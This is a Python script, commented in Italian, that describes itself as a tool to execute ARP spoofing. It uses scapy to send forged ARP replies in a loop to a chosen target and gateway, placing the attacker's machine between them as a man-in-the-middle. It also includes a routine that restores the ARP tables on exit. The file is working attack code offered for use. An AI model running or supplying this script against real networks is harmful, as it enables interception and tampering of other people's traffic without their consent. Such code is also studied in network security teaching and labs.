from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys
import argparse

parser = argparse.ArgumentParser(
    description="Tool to execute ARP spoofing"
)

parser.add_argument(
    "-g",
    "--gateway",
    dest="gateway",
    help="IP address of the gateway/DNS server",
    type=str,
)

parser.add_argument(
    "-t",
    "--target",
    dest="target",
    help="IP address of the target",
    type=str,
)

args = parser.parse_args()

if not args.gateway:
    print("Gateway required!")
    parser.print_help()
    sys.exit(1)
   
if not args.target:
    print("Target required!")
    parser.print_help()
    sys.exit(1)
    
# Ritorna il MAC Address di qualsiasi dispositivo connesso alla rete
def get_mac(ip):
    # Manda un pacchetto ARP in broadcast
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


# Fa spoofing indicando a target_ip di essere host_ip
def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)

    # viene costruito un pacchetto ARP 'is-at' (una ARP reply)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)

    if verbose:
        # Prende il MAC address dell'interfaccia di rete che si sta utilizzando
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


# Annulla le modifiche applicate alle ARP tables
def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")

    # la risposta viene mandata tante volte per assicurarsi che tutto vada a buon fine (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

def main():
    target = args.target                    	# indirizzo IP della vittima
    gateway = args.gateway                      # indirizzo IP del gateway
    verbose = True
    try:
        while True:
            spoof(target, gateway, verbose)    # dico alla vittima che sono il gateway
            spoof(gateway, target, verbose)    # dico al gateway che sono la vittima
            
            time.sleep(3)
    except KeyboardInterrupt:
        print("[!] CTRL+C ! Restoring the ARP tables, please wait...")
        restore(target, gateway)
        restore(gateway, target)
        
if __name__ == "__main__":
    main()
    
